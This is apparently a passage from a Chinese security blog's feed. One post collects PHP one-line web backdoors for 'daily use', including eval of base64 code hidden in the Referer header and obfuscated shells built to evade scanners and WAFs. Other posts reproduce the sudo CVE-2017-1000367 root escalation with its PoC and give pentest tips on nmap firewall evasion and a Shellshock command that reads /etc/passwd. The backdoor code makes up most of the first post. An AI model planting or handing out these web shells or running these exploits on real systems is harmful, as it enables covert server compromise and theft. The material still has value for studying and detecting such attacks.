class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="comment">//1.php   </span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);   </span><br><span class="line">parse_str($_SERVER[<span class="string">'HTTP_REFERER'</span>], $a);   </span><br><span class="line"><span class="keyword">if</span>(reset($a) == <span class="string">'10'</span> &amp;&amp; count($a) == <span class="number">9</span>) &#123;   </span><br><span class="line">   <span class="keyword">eval</span>(base64_decode(str_replace(<span class="string">" "</span>, <span class="string">"+"</span>, implode(array_slice($a, <span class="number">6</span>)))));   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php   </span><br><span class="line">//2.php   header(&apos;Content-type:text/html;charset=utf-8&apos;);   </span><br><span class="line">//要执行的代码   $code = &lt;&lt;&lt;CODE   phpinfo();   </span><br><span class="line">CODE;   </span><br><span class="line">//进行base64编码   </span><br><span class="line">$code = base64_encode($code);   </span><br><span class="line">//构造referer字符串   </span><br><span class="line">$referer = &quot;a=10&amp;b=ab&amp;c=34&amp;d=re&amp;e=32&amp;f=km&amp;g=&#123;$code&#125;&amp;h=&amp;i=&quot;;   //后门url   $url = &apos;http://localhost/test1/1.php&apos;;   </span><br><span class="line">$ch = curl_init();   </span><br><span class="line">$options = array(   </span><br><span class="line">    CURLOPT_URL =&gt; $url,   </span><br><span class="line">    CURLOPT_HEADER =&gt; FALSE,   </span><br><span class="line">    CURLOPT_RETURNTRANSFER =&gt; TRUE,   </span><br><span class="line">    CURLOPT_REFERER =&gt; $referer   </span><br><span class="line">);   </span><br><span class="line">curl_setopt_array($ch, $options);   </span><br><span class="line">echo curl_exec($ch);</span><br></pre></td></tr></table></figure><p><code>通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测。用这个思路bypass waf不错。</code></p><h2 id="无特征隐藏PHP一句话："><a href="#无特征隐藏PHP一句话：" class="headerlink" title="无特征隐藏PHP一句话："></a>无特征隐藏PHP一句话：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">session_start();   </span><br><span class="line">$_POST[<span class="string">'code'</span>] &amp;&amp; $_SESSION[<span class="string">'theCode'</span>] = trim($_POST[<span class="string">'code'</span>]);   </span><br><span class="line">$_SESSION[<span class="string">'theCode'</span>]&amp;&amp;preg_replace(<span class="string">'\'a\'eis'</span>,<span class="string">'e'</span>.<span class="string">'v'</span>.<span class="string">'a'</span>.<span class="string">'l'</span>.<span class="string">'(base64_decode($_SESSION[\'theCode\']))'</span>,<span class="string">'a'</span>);</span><br></pre></td></tr></table></figure><p><code>将$_POST[&#39;code&#39;]的内容赋值给$_SESSION[&#39;theCode&#39;]，然后执行$_SESSION[&#39;theCode&#39;]，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。</code></p><h2 id="高级的php一句话"><a href="#高级的php一句话" class="headerlink" title="高级的php一句话"></a>高级的php一句话</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、   </span><br><span class="line">$hh = <span class="string">"p"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"g"</span>.<span class="string">"_"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"p"</span>.<span class="string">"l"</span>.<span class="string">"a"</span>.<span class="string">"c"</span>.<span class="string">"e"</span>;   </span><br><span class="line">$hh(<span class="string">"/[discuz]/e"</span>,$_POST[<span class="string">'h'</span>],<span class="string">"Access"</span>);   </span><br><span class="line"><span class="comment">//菜刀一句话   </span></span><br><span class="line"><span class="number">2</span>、   </span><br><span class="line">$filename=$_GET[<span class="string">'xbid'</span>];   </span><br><span class="line"><span class="keyword">include</span> ($filename);   </span><br><span class="line"><span class="comment">//危险的include函数，直接编译任何文件为php格式运行   </span></span><br><span class="line"><span class="number">3</span>、   </span><br><span class="line">$reg=<span class="string">"c"</span>.<span class="string">"o"</span>.<span class="string">"p"</span>.<span class="string">"y"</span>;   </span><br><span class="line">$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);   </span><br><span class="line"><span class="comment">//重命名任何文件   </span></span><br><span class="line"><span class="number">4</span>、   </span><br><span class="line">$gzid = <span class="string">"p"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"g"</span>.<span class="string">"_"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"p"</span>.<span class="string">"l"</span>.<span class="string">"a"</span>.<span class="string">"c"</span>.<span class="string">"e"</span>;   </span><br><span class="line">$gzid(<span class="string">"/[discuz]/e"</span>,$_POST[<span class="string">'h'</span>],<span class="string">"Access"</span>);   </span><br><span class="line"><span class="comment">//菜刀一句话   </span></span><br><span class="line"><span class="number">5</span>、<span class="keyword">include</span> ($uid);   </span><br><span class="line"><span class="comment">//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif   //gif插一句话   </span></span><br><span class="line"><span class="number">6</span>、典型一句话   </span><br><span class="line">程序后门代码   </span><br><span class="line"><span class="meta">&lt;?php</span> eval_r($_POST[sb])<span class="meta">?&gt;</span>   </span><br><span class="line">程序代码   </span><br><span class="line"><span class="meta">&lt;?php</span> @eval_r($_POST[sb])<span class="meta">?&gt;</span>   </span><br><span class="line"><span class="comment">//容错代码   程序代码   </span></span><br><span class="line"><span class="meta">&lt;?php</span> assert($_POST[sb]);<span class="meta">?&gt;</span>   </span><br><span class="line"><span class="comment">//使用lanker一句话客户端的专家模式执行相关的php语句   </span></span><br><span class="line">程序代码   </span><br><span class="line"><span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>]);<span class="meta">?&gt;</span>   </span><br><span class="line">程序代码   </span><br><span class="line"><span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>],$_POST[<span class="string">'sc'</span>])<span class="meta">?&gt;</span>   </span><br><span class="line">程序代码   </span><br><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">@preg_replace(<span class="string">"/[email]/e"</span>,$_POST[<span class="string">'h'</span>],<span class="string">"error"</span>);   </span><br><span class="line"><span class="meta">?&gt;</span>   </span><br><span class="line"><span class="comment">//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入   </span></span><br><span class="line">程序代码   </span><br><span class="line">&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt;   </span><br><span class="line">程序代码   </span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@eval_r($_POST[sb])&lt;/script&gt;  </span><br><span class="line"> <span class="comment">//绕过<span class="meta">&lt;?</span>限制的一句话</span></span><br></pre></td></tr></table></figure><h2 id="如何应对"><a href="#如何应对" class="headerlink" title="如何应对"></a>如何应对</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1，对PHP程序编写要有安全意识   </span><br><span class="line">2，服务器日志文件要经常看，经常备份   </span><br><span class="line">3，对每个站点进行严格的权限分配   </span><br><span class="line">4，对动态文件及目录经常批量安全审查   </span><br><span class="line">5，学会如何进行手工杀毒《即行为判断查杀》   </span><br><span class="line">6，时刻关注，或渗入活跃的网络安全营地   </span><br><span class="line">7，对服务器环境层级化处理，哪怕一个函数也可做规则</span><br></pre></td></tr></table></figure><p> 参考：<a href="https://mp.weixin.qq.com/s/SCk_Q8oG22SaHX3qJ08HeQ" target="_blank" rel="noopener">PHP一句话后门</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/SCk_Q8oG22SaHX3qJ08HeQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;img style=&quot;position: absolute; top: 0; right: 0; border: 0;&quot; src=&quot;http://obgutsg63.bkt.clouddn.com/zhuanzai.png&quot; alt=&quot;转载&quot; data-canonical-src=&quot;http://obgutsg63.bkt.clouddn.com/zhuanzai.png&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/37992-106.jpg&quot; alt=&quot;enter description here&quot; title=&quot;web&quot;&gt;&lt;/p&gt;
&lt;p&gt;收集一些一句话，以便日常使用。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="web后门" scheme="http://airs-sec.com/tags/web%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux sudo漏洞（CVE-2017-1000367）复现</title>
    <link href="http://airs-sec.com/2017/07/02/Linux-sudo%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-1000367%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
    <id>http://airs-sec.com/2017/07/02/Linux-sudo漏洞（CVE-2017-1000367）复现/</id>
    <published>2017-07-02T08:40:15.000Z</published>
    <updated>2017-07-02T08:47:43.728Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE20170615212613.png" alt="sudoers"></p><blockquote><p>该高危漏洞 CVE-2017-1000367 （High级别）发生在 Linux 的 Sudo 命令中的 get_process_ttyname() 函数中。</p></blockquote><blockquote><p>攻击者可以利用这个漏洞，让普通用户在使用 Sudo 命令获得临时权限时执行一些操作，将他们的权限提升到root级别。</p></blockquote><blockquote><p>在运用 SELinux 机制的系统上，Sudo 用户可以使用命令行的输出提升自己的用户权限，还可以在文件系统中覆盖文件系统中的文件（甚至覆盖由root用户所拥有的文件）。</p></blockquote><a id="more"></a><h2 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h2><p><a href="https://github.com/c0d3z3r0/sudo-CVE-2017-1000367" target="_blank" rel="noopener">https://github.com/c0d3z3r0/sudo-CVE-2017-1000367</a></p><h3 id="1-添加一个普通用户"><a href="#1-添加一个普通用户" class="headerlink" title="1.添加一个普通用户"></a>1.添加一个普通用户</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd toor</span><br><span class="line"></span><br><span class="line">passwd toor</span><br></pre></td></tr></table></figure><p><strong>编辑/etc/sudoers文件，添加toor ALL=(ALL) NOPASSWD: /usr/bin/sum</strong></p><p><img src="http://obgutsg63.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE20170615202057.png" alt="1"></p><h3 id="2-切换到toor（普通用户）"><a href="#2-切换到toor（普通用户）" class="headerlink" title="2.切换到toor（普通用户）"></a>2.切换到toor（普通用户）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# su toor</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> cat /etc/motd</span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU/Linux system are free software;</span><br><span class="line"></span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line"></span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line"></span><br><span class="line">permitted by applicable law.</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> sudo echo test</span><br><span class="line"></span><br><span class="line">[sudo] password for toor: </span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> sudo sum -h</span><br><span class="line"></span><br><span class="line">sum: invalid option -- 'h'</span><br></pre></td></tr></table></figure><h3 id="3-clone-git上的poc"><a href="#3-clone-git上的poc" class="headerlink" title="3.clone git上的poc"></a>3.clone git上的poc</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span># 如果不能git clone，则加上sudo，以root的身份git</span><br><span class="line"><span class="meta">$</span> git clone https://github.com/c0d3z3r0/sudo-CVE-2017-1000367.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> cd sudo-CVE-2017-1000367</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span># 编译</span><br><span class="line">gcc -o sudopwn sudopwn.c -lutil</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span># 编译后文件如下</span><br><span class="line"><span class="meta">$</span> ls</span><br><span class="line">README.md  Screenshot_2017-06-05_21-40-38.png  sudopwnsudopwn.c</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>#　执行 sudopwn</span><br><span class="line"><span class="meta">$</span> ./sudopwn</span><br><span class="line">/usr/bin/sum: unrecognized option '--</span><br><span class="line">HELLO</span><br><span class="line">WORLD</span><br><span class="line">'</span><br><span class="line">Try '/usr/bin/sum --help' for more information.</span><br></pre></td></tr></table></figure><p><strong>已普通用户的身份查看passwd文件</strong></p><pre><code class="shell"><span class="meta">$</span><span class="bash"> cat /etc/passwd</span> root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false epmd:x:106:110::/var/run/epmd:/bin/false Debian-exim:x:107:111::/var/spool/exim4:/bin/false uuidd:x:108:113::/run/uuidd:/bin/false rwhod:x:109:65534::/var/spool/rwho:/bin/false redsocks:x:110:114::/var/run/redsocks:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false miredo:x:112:65534::/var/run/miredo:/bin/false Debian-snmp:x:113:116::/var/lib/snmp:/bin/false ntp:x:114:117::/home/ntp:/bin/false stunnel4:x:115:119::/var/run/stunnel4:/bin/false sslh:x:116:120::/nonexistent:/bin/false rtkit:x:117:121:RealtimeKit,,,:/proc:/bin/false postgres:x:118:122:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash dnsmasq:x:119:65534:dnsmasq,,,:/var/lib/misc:/bin/false messagebus:x:120:123::/var/run/dbus:/bin/false iodine:x:121:65534::/var/run/iodine:/bin/false arpwatch:x:122:125:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh couchdb:x:123:128:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash avahi:x:124:131:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false sshd:x:125:65534::/run/sshd:/usr/sbin/nologin colord:x:126:132:colord colour management daemon,,,:/var/lib/colord:/bin/false saned:x:127:134::/var/lib/saned:/bin/false speech-dispatcher:x:128:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false pulse:x:129:135:PulseAudio daemon,,,:/var/run/pulse:/bin/false king-phisher:x:130:137::/var/lib/king-phisher:/bin/false Debian-gdm:x:131:138:Gnome Display Manager:/var/lib/gdm3:/bin/false dradis:x:132:139::/var/lib/dradis:/bin/false beef-xss:x:133:140::/var/lib/beef-xss:/bin/false toor:x:1000:1000::/home/toor:</code></pre><p><strong>参考：</strong></p><p>1.<a href="https://github.com/c0d3z3r0/sudo-CVE-2017-1000367" target="_blank" rel="noopener">https://github.com/c0d3z3r0/sudo-CVE-2017-1000367</a></p><p>2.<a href="http://www.freebuf.com/articles/system/136975.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/136975.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE20170615212613.png&quot; alt=&quot;sudoers&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;该高危漏洞 CVE-2017-1000367 （High级别）发生在 Linux 的 Sudo 命令中的 get_process_ttyname() 函数中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;攻击者可以利用这个漏洞，让普通用户在使用 Sudo 命令获得临时权限时执行一些操作，将他们的权限提升到root级别。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;在运用 SELinux 机制的系统上，Sudo 用户可以使用命令行的输出提升自己的用户权限，还可以在文件系统中覆盖文件系统中的文件（甚至覆盖由root用户所拥有的文件）。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pentest Tips and Tricks02</title>
    <link href="http://airs-sec.com/2017/06/25/Pentest-Tips-and-Tricks02/"/>
    <id>http://airs-sec.com/2017/06/25/Pentest-Tips-and-Tricks02/</id>
    <published>2017-06-25T09:42:26.000Z</published>
    <updated>2017-06-25T09:50:12.858Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>渗透测试常用技巧和窍门第一部分，来自国外的EK，<a href="https://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2/" target="_blank" rel="noopener">看原文的走这。</a></p></blockquote><h1 id="Pentest-Tips-and-Tricks-02-渗透测试的技巧和窍门"><a href="#Pentest-Tips-and-Tricks-02-渗透测试的技巧和窍门" class="headerlink" title="Pentest Tips and Tricks #02(渗透测试的技巧和窍门)"></a>Pentest Tips and Tricks #02(渗透测试的技巧和窍门)</h1><h2 id="Tor-Nat-Traversal"><a href="#Tor-Nat-Traversal" class="headerlink" title="Tor Nat Traversal"></a>Tor Nat Traversal</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># install to server</span><br><span class="line">$ apt-get install tor torsocks</span><br><span class="line"></span><br><span class="line"># bind ssh to tor service port 80</span><br><span class="line"># /etc/tor/torrc</span><br><span class="line">SocksPolicy accept 127.0.0.1</span><br><span class="line">SocksPolicy accept 192.168.0.0/16</span><br><span class="line">Log notice file /var/log/tor/notices.log</span><br><span class="line">RunAsDaemon 1</span><br><span class="line">HiddenServiceDir /var/lib/tor/ssh_hidden_service/</span><br><span class="line">HiddenServicePort 80 127.0.0.1:22</span><br><span class="line">PublishServerDescriptor 0</span><br><span class="line">$ /etc/init.d/tor start</span><br><span class="line">$ cat /var/lib/tor/ssh_hidden_service/hostname</span><br><span class="line">3l5zstvt1zk5jhl662.onion</span><br><span class="line"></span><br><span class="line"># ssh connect from client</span><br><span class="line">$ apt-get install torsocks</span><br><span class="line">$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="DNS-brute-forcing-with-fierce"><a href="#DNS-brute-forcing-with-fierce" class="headerlink" title="DNS brute forcing with fierce"></a>DNS brute forcing with fierce</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># http://ha.ckers.org/fierce/</span><br><span class="line">$ ./fierce.pl -dns example.com</span><br><span class="line">$ ./fierce.pl –dns example.com –wordlist myWordList.txt</span><br></pre></td></tr></table></figure><h2 id="Metagoofil-metadata-gathering-tool"><a href="#Metagoofil-metadata-gathering-tool" class="headerlink" title="Metagoofil metadata gathering tool"></a>Metagoofil metadata gathering tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># http://www.edge-security.com/metagoofil.php</span><br><span class="line">#automate search engine document retrieval and analysis. It also has the capability to provide MAC</span><br><span class="line"># addresses, username listings, and more</span><br><span class="line">$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html</span><br></pre></td></tr></table></figure><h2 id="A-best-NMAP-scan-strategy"><a href="#A-best-NMAP-scan-strategy" class="headerlink" title="A best NMAP scan strategy"></a>A best NMAP scan strategy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># A best nmap scan strategy for networks of all sizes</span><br><span class="line"></span><br><span class="line"># Host Discovery - Generate Live Hosts List</span><br><span class="line">$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24</span><br><span class="line">$ grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d &apos; &apos; &gt; LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># Port Discovery - Most Common Ports</span><br><span class="line"># http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</span><br><span class="line">$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span><br><span class="line">$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt</span><br><span class="line">$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># Port Discovery - Full Port Scans (UDP is very slow)</span><br><span class="line">$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt</span><br><span class="line">$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># Print TCP\UDP Ports</span><br><span class="line">$ grep &quot;open&quot; FullTCP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;T:&quot;$0&#125;&apos;</span><br><span class="line">$ grep &quot;open&quot; FullUDP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;U:&quot;$0&#125;&apos;</span><br><span class="line"></span><br><span class="line"># Detect Service Version</span><br><span class="line">$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># Operating System Scan</span><br><span class="line">$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># OS and Service Detect</span><br><span class="line">$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure><h2 id="Nmap-–-Techniques-for-Avoiding-Firewalls"><a href="#Nmap-–-Techniques-for-Avoiding-Firewalls" class="headerlink" title="Nmap – Techniques for Avoiding Firewalls"></a>Nmap – Techniques for Avoiding Firewalls</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># fragmentation</span><br><span class="line">$ nmap -f</span><br><span class="line"></span><br><span class="line"># change default MTU size number must be a multiple of 8 (8,16,24,32 etc)</span><br><span class="line">$ nmap --mtu 24</span><br><span class="line"></span><br><span class="line"># Generates a random number of decoys</span><br><span class="line">$ nmap -D RND:10 [target]</span><br><span class="line"></span><br><span class="line"># Manually specify the IP addresses of the decoys</span><br><span class="line">$ nmap -D decoy1,decoy2,decoy3 etc.</span><br><span class="line"></span><br><span class="line"># Idle Zombie Scan, first t need to find zombie ip</span><br><span class="line">$ nmap -sI [Zombie IP] [Target IP]</span><br><span class="line"></span><br><span class="line"># Source port number specification</span><br><span class="line">$ nmap --source-port 80 IP</span><br><span class="line"></span><br><span class="line"># Append Random Data to scan packages</span><br><span class="line">$ nmap --data-length 25 IP</span><br><span class="line"></span><br><span class="line"># MAC Address Spoofing, generate different mac for host pc</span><br><span class="line">$ nmap --spoof-mac Dell/Apple/3Com IP</span><br></pre></td></tr></table></figure><h2 id="Exploit-servers-to-Shellshock-利用服务器的shellshock"><a href="#Exploit-servers-to-Shellshock-利用服务器的shellshock" class="headerlink" title="Exploit servers to Shellshock(利用服务器的shellshock)"></a>Exploit servers to Shellshock(利用服务器的shellshock)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># A tool to find and exploit servers vulnerable to Shellshock</span><br><span class="line"># https://github.com/nccgroup/shocker</span><br><span class="line">$ ./shocker.py -H 192.168.56.118  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status 